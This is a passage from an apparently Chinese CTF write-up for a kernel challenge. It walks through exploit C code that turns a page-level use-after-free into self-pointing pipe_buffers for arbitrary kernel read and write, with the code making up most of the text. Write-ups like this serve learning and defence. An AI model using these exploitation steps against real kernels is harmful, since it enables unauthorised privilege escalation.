+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br></code></pre></td></tr></table></figure></li>
+</ul>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png" srcset="/img/loading.gif" lazyload class title="uaf2">
+
+<p>此时我们可以通过第一次uaf获取victim pipe_buffer的内容，泄露victim page的地址</p>
+<ul>
+<li><p>然后再在victim page上造一个uaf，再把victim page分配为pipe_buffer数组</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf3.png" srcset="/img/loading.gif" lazyload class title="uaf3">
+</li>
+<li><p>由于我们已经知道了victim page的地址，可以把victim pipe_buffer2-&gt;page再指回victim page，我改我自己（</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf4.png" srcset="/img/loading.gif" lazyload class title="uaf4"></li>
+</ul>
+<p>这时就可以修改pipe_buffer的offset和len来控制pipe的读写起始位置（offset是读起始位置，len是写起始位置 - 读起始位置）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>继续exp</p>
+<p>我们需要3个这样的self-pointing pipe_buffer</p>
+<ul>
+<li><p>先向victim pipe里写一些数据不然之后无法读取</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>制造页级uaf，利用fcntl将pipe_buffer分配到uaf页上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>泄露pipe_buffer-&gt;page和pipe_buffer-&gt;ops</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>       <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>       info_pipe_buf.page, info_pipe_buf.ops);<br>  <br><span class="hljs-keyword">if</span>((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span> || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>&#125;<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br></code></pre></td></tr></table></figure>
+
+<p>解释一下读写数据量的计算，先是read</p>
+<ul>
+<li><p>由于之前已经读取了8+4字节用于判断page重叠是否成功，所以此时offset为12，想要读取在pipe_buffer结构体开始的成员就只能读取下一个slab-96的pipe_buffer</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read1.png" srcset="/img/loading.gif" lazyload class title="read1">
+</li>
+<li><p>所以要先读取96-8-4字节才能读到第二个slab-96的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read2.png" srcset="/img/loading.gif" lazyload class title="read2"></li>
+</ul>
+<p>再解释一下write的数据量计算</p>
+<ul>
+<li><p>由于write的偏移一定在read之后，所以要想更改pipe_buffer只能改第三个slab-96的piipe_buffer（前两个用于read了）</p>
+</li>
+<li><p>之前已经向pipe中写入了8 * 5 + 4 * 2字节，所以要先write这么多👇字节来保证此时write的偏移位于第三个slab-96的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write1.png" srcset="/img/loading.gif" lazyload class title="write1"></li>
+</ul>
+</li>
+<li><p>更改pipe_buffer-&gt;page制造第二个uaf，并确定victim pipe_buffer的序号snd_vicitm_pid</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*)((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">int</span> nr;<br>    <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>    <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">if</span>(nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)<br>    &#123;<br>        snd_orig_pid = nr;<br>        snd_vicitm_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>               <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>               snd_vicitm_pid, snd_orig_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(snd_vicitm_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write2.png" srcset="/img/loading.gif" lazyload class title="write2"></li>
+</ul>
+<p>进入眼花缭乱的阶段(ˉ▽ˉ；)…，building_self_writing_pipe</p>
+<ul>
+<li><p>我们要再次将uaf的page分配为pipe_buffer，这次选择slab-192，逻辑与上次一致</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br>  <br><span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br></code></pre></td></tr></table></figure>
+
+<p>这次我们要改写第二个slab-192的pipe_buffer（之前已写入40 + 2 * 4字节）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>  <br><span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br>  <br><span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>更改第二个slab-192的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>evil_pipe_buf.page = info_pipe_buf.page;<br>evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.ops = info_pipe_buf.ops;<br>evil_pipe_buf.flags = info_pipe_buf.flags;<br>evil_pipe_buf.private = info_pipe_buf.private;<br>  <br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point.png" srcset="/img/loading.gif" lazyload class title="slf-point">
+</li>
+<li><p>检查劫持是否成功（根据pipe_buffer-&gt;page），确定第一个self-pointing pipe_buffer序号self_2nd_pipe_pid</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* check for third-level victim pipe */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>    <span class="hljs-keyword">if</span>(page_ptr == evil_pipe_buf.page)<br>    &#123;<br>        self_2nd_pipe_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                self_2nd_pipe_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-keyword">if</span>(self_2nd_pipe_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获得第二个self-pointing pipe_buffer，确定序号self_3rd_pipe_pid，这时更改的是第三个slab-192的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>  <br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>  <br><span class="hljs-comment">/* check for third-level victim pipe */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>    <span class="hljs-keyword">if</span>(page_ptr == evil_pipe_buf.page)<br>    &#123;<br>        self_3rd_pipe_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-keyword">if</span>(self_3rd_pipe_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point1.png" srcset="/img/loading.gif" lazyload class title="slf-point1">
+</li>
+<li><p>获得第三个self-pointing pipe_buffer，确定序号self_4th_pipe_pid，这时更改的是第四个slab-192的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>  <br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>  <br><span class="hljs-comment">/* check for third-level victim pipe */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>    <span class="hljs-keyword">if</span>(page_ptr == evil_pipe_buf.page)<br>    &#123;<br>        self_4th_pipe_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point2.png" srcset="/img/loading.gif" lazyload class title="slf-point2">
+</li>
+<li><p>以上过程<strong>大部分pipe</strong>需要读取2次<strong>8字节字符串+4字节序号</strong>，三次<strong>8字节指针</strong>，所以最开始需要这么write👇</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p><em><strong>ps：因为开启了Random freelist，所以获取的self-pointing pipe_buffer的序号可能不是连续的</strong></em></p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/random.png" srcset="/img/loading.gif" lazyload class title="random">
+
+<h2 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h2><p>现在我们有三个self-pointing pipe_buffer</p>
+<ul>
+<li>第一个管道用以进行内存空间中的任意读写，我们通过修改其 page 指针完成</li>
+<li>第二个管道用以修改第三个管道，使其写入的起始位置指向第一个管道</li>
+<li>第三个管道用以修改第一个与第二个管道，使得第一个管道的 pipe 指针指向指定位置，第二个管道的写入起始位置指向第三个管道</li>
+</ul>
+<p>继续exp</p>
+<ul>
+<li><p>先调用setup_evil_pipe进行一些初始化</p>
+<ul>
+<li><p>先进行一些覆盖</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br><span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>第一个管道用于进行任意读写，先将read初始化为页开始，write初始化为页尾</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe2.png" srcset="/img/loading.gif" lazyload class title="pipe2">
+</li>
+<li><p>第二个管道用于修改第三个管道，所以利用第三个管道修改第二个管道，read，write都指向第三个管道（初始化时第三个管道的read指向第一个管道，write指向第二个管道）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe3.png" srcset="/img/loading.gif" lazyload class title="pipe3">
+</li>
+<li><p>第三个管道用于修改第一第二个管道，所以write，read都指向第一个管道（在每次任意读写时初始化）</p>
